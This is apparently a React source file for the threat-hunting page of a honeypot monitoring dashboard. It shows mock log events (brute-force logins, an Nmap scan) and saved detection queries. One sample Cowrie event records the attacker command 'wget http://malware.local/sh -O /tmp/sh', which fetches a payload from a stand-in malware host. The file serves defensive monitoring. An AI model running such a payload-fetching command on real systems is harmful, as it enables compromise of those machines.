"use client";

import { useState } from 'react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Search, Terminal, Filter, Download, Save, Calendar, ArrowRight } from 'lucide-react';

const results = [
  { time: '2023-10-24 14:32:01', sensor: 'eu-west-1a-ssh', type: 'SSH Login', src_ip: '185.150.11.20', user: 'root', password: '123', mitre: 'T1110.001', raw: '{"eventid": "cowrie.login.failed", "src_ip": "185.150.11.20", "username": "root", "password": "123"}' },
  { time: '2023-10-24 14:32:05', sensor: 'eu-west-1a-ssh', type: 'SSH Login', src_ip: '185.150.11.20', user: 'admin', password: 'admin', mitre: 'T1110.001', raw: '{"eventid": "cowrie.login.failed", "src_ip": "185.150.11.20", "username": "admin", "password": "admin"}' },
  { time: '2023-10-24 14:35:12', sensor: 'eu-west-1a-ssh', type: 'Command Exec', src_ip: '192.168.1.5', user: 'root', password: 'N/A', mitre: 'T1059.004', raw: '{"eventid": "cowrie.command.input", "input": "wget http://malware.local/sh -O /tmp/sh"}' },
  { time: '2023-10-24 14:36:20', sensor: 'us-east-web', type: 'HTTP Scan', src_ip: '45.33.32.156', user: 'N/A', password: 'N/A', mitre: 'T1595.002', raw: '{"eventid": "http.scan", "path": "/admin", "method": "GET", "user_agent": "Nmap Scripting Engine"}' },
  { time: '2023-10-24 14:38:00', sensor: 'db-honeypot-01', type: 'SQL Login', src_ip: '185.150.11.20', user: 'sa', password: 'sa', mitre: 'T1110.001', raw: '{"eventid": "mysql.login.failed", "src_ip": "185.150.11.20", "username": "sa"}' },
];

const savedSearches = [
  { name: 'Brute Force — Last 24h', query: 'mitre:"T1110" AND time:>now-24h' },
  { name: 'Critical from Tor', query: 'severity:"CRITICAL" AND src_ip.geo.country:"TOR"' },
  { name: 'Command Injection', query: 'type:"Command Exec" AND raw:*wget*' },
];

export default function ThreatHunting() {
  const [query, setQuery] = useState('sensor_id:"eu-west-1a-ssh" AND severity:("HIGH" OR "CRITICAL")');
  const [expandedRow, setExpandedRow] = useState<number | null>(null);

  return (
    <div className="space-y-6 h-full flex flex-col animate-in fade-in slide-in-from-bottom-4 duration-500">
      <header className="flex justify-between items-end">
        <div>
          <h2 className="text-3xl font-bold flex items-center gap-3">
            <Search className="text-blue-500" size={32} />
            Threat Hunting
          </h2>
          <p className="text-gray-400 mt-2">Query telemetry, investigate IOCs, and build custom detections</p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" className="gap-2"><Save size={16}/> Save Search</Button>
          <Button variant="outline" className="gap-2"><Download size={16}/> Export CSV</Button>
        </div>
      </header>

      {/* Search Bar */}
      <Card className="bg-gray-900 border-gray-800">
        <CardContent className="p-4">
          <div className="flex gap-3">
            <div className="flex-1 relative">
              <Terminal className="absolute left-3 top-3 text-gray-500" size={16} />
              <Input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                className="pl-9 font-mono text-sm bg-gray-950 border-gray-800 h-10"
                placeholder='sensor_id:"eu-west-1a-ssh" AND severity:("HIGH" OR "CRITICAL")'
              />
            </div>
            <Button variant="outline" className="gap-2 shrink-0"><Calendar size={16} /> Last 24h</Button>
            <Button variant="outline" className="gap-2 shrink-0"><Filter size={16} /> Filters</Button>
            <Button className="bg-blue-600 hover:bg-blue-500 gap-2 shrink-0 px-6">
              <Search size={16} /> Search
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="flex gap-6 flex-1 min-h-0">
        {/* Saved Searches Sidebar */}
        <div className="w-56 flex flex-col gap-4 shrink-0">
          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-3">
              <CardTitle className="text-sm">Saved Searches</CardTitle>
            </CardHeader>
            <CardContent className="p-3 space-y-1">
              {savedSearches.map((s, i) => (
                <button
                  key={i}
                  onClick={() => setQuery(s.query)}
                  className="w-full text-left px-3 py-2 text-xs rounded-md text-gray-300 hover:bg-gray-800 hover:text-white transition-colors flex items-center justify-between group"
                >
                  <span className="truncate">{s.name}</span>
                  <ArrowRight size={12} className="text-gray-600 group-hover:text-blue-400 shrink-0 ml-1" />
                </button>
              ))}
            </CardContent>
          </Card>
          <Card className="bg-gray-900 border-gray-800">
            <CardHeader className="border-b border-gray-800 pb-3">
              <CardTitle className="text-sm">Quick Stats</CardTitle>
            </CardHeader>
            <CardContent className="p-4 space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-400">Results</span>
                <span className="font-mono font-semibold">{results.length}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Unique IPs</span>
                <span className="font-mono font-semibold">{new Set(results.map(r => r.src_ip)).size}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Sensors</span>
                <span className="font-mono font-semibold">{new Set(results.map(r => r.sensor)).size}</span>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Results Table */}
        <Card className="flex-1 bg-gray-900 border-gray-800 flex flex-col overflow-hidden">
          <CardHeader className="border-b border-gray-800 bg-gray-950 pb-3 flex flex-row items-center justify-between">
            <CardTitle className="text-sm text-gray-400">
              {results.length} results found
            </CardTitle>
          </CardHeader>
          <CardContent className="p-0 flex-1 overflow-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Time</TableHead>
                  <TableHead>Sensor</TableHead>
                  <TableHead>Type</TableHead>
                  <TableHead>Source IP</TableHead>
                  <TableHead>User</TableHead>
                  <TableHead>MITRE</TableHead>
                  <TableHead className="text-right">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {results.map((row, i) => (
                  <>
                    <TableRow
                      key={i}
                      className="cursor-pointer hover:bg-gray-800/50"
                      onClick={() => setExpandedRow(expandedRow === i ? null : i)}
                    >
                      <TableCell className="font-mono text-xs text-gray-400">{row.time}</TableCell>
                      <TableCell className="font-mono text-xs">{row.sensor}</TableCell>
                      <TableCell>
                        <Badge variant={row.type === 'Command Exec' ? 'destructive' : 'secondary'} className="text-[10px]">
                          {row.type}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-mono text-sm text-orange-400">{row.src_ip}</TableCell>
                      <TableCell className="text-sm text-gray-300">{row.user}</TableCell>
                      <TableCell>
                        <Badge variant="outline" className="font-mono text-[10px] bg-blue-500/10 text-blue-400 border-blue-500/30">
                          {row.mitre}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-right">
                        <Button variant="ghost" size="sm" className="text-blue-400 hover:text-blue-300 text-xs">
                          Pivot
                        </Button>
                      </TableCell>
                    </TableRow>
                    {expandedRow === i && (
                      <TableRow key={`${i}-raw`}>
                        <TableCell colSpan={7} className="bg-gray-950 border-t border-gray-800 p-0">
                          <pre className="text-xs text-gray-400 font-mono p-4 overflow-x-auto whitespace-pre-wrap break-all">
                            {JSON.stringify(JSON.parse(row.raw), null, 2)}
                          </pre>
                        </TableCell>
                      </TableRow>
                    )}
                  </>
                ))}
              </TableBody>
            </Table>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
